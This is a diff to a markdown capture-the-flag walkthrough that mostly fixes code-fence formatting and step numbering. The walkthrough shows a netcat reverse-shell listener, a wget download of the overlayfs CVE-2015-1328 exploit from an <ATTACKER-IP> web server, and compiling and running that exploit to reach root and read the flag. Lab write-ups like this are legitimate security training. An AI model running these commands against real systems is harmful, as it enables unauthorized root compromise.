@@ -132,7 +132,7 @@ Click Save changes.
 
    3. Triggering the Reverse Shell:
         Start a Netcat listener on your Kali machine:
-    ```bash
+        ```bash
     nc -lvnp 443
     ```
 
@@ -152,61 +152,67 @@ Type text into the body editor and trigger the spellcheck functionality, executi
 ## Root Privilege Escalation
 ### 10. Target System Reconnaissance
 After obtaining the shell, enumerate the OS and kernel version:
-        ```bash
+```bash
             uname -a
-        ```
+```
 Output:
-        ```bash 
+        
+```bash 
             Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
-        ```
+```
 
 ### 11. Exploit Execution: overlayfs (CVE-2015-1328)
 
 The target running Ubuntu with Kernel ```3.13.0-32``` is vulnerable to the overlayfs local privilege escalation exploit (Exploit-DB ID: ```37292```).
 1.Host Attacker Web Server:
     Serve the exploit C code (```37292.c```) using Python on your Kali machine:
-        ```bash 
+    
+```bash 
             python3 -m http.server 8081
-        ```
+```
 
 2. Download Exploit to Target:
 Navigate to the world-writable ```/tmp``` directory on the victim host and fetch the file:
-        ```bash
+
+    ```bash
            cd /tmp
            wget http://<ATTACKER-IP>:8081/37292.c
        ```
 
-3. Compile Exploit:
+4. Compile Exploit:
 Replace standard compiler flags if needed and compile:
-        ```bash
+
+    ```bash
            sed -i "s/gcc/cc/g" 37292.c
            cc 37292.c -o exploited
        ```
 
-4. Execute Exploit:
+5. Execute Exploit:
 Run the binary to escalate privileges to root:
-        ```bash
+
+    ```bash
            ./exploited
        ```
 
 ### 12. Root Access & Flag Retrieval
 
 1. Verify Root Privileges:
-        ```bash
+
+    ```bash
                id
                Output: uid=0(root) gid=0(root) groups=0(root)
         ```
 
-2. Read Hidden Root Flag:
-        ```bash
+3. Read Hidden Root Flag:
+
+    ```bash
                cat /root/.flag.txt
        ```
 
 Contents of ```.flag.txt```:
-       
         ```bash 
             
-            Alec told me to place the codes here:
+             Alec told me to place the codes here:
             
             568628e0d993b1973adc718237da6e93
             
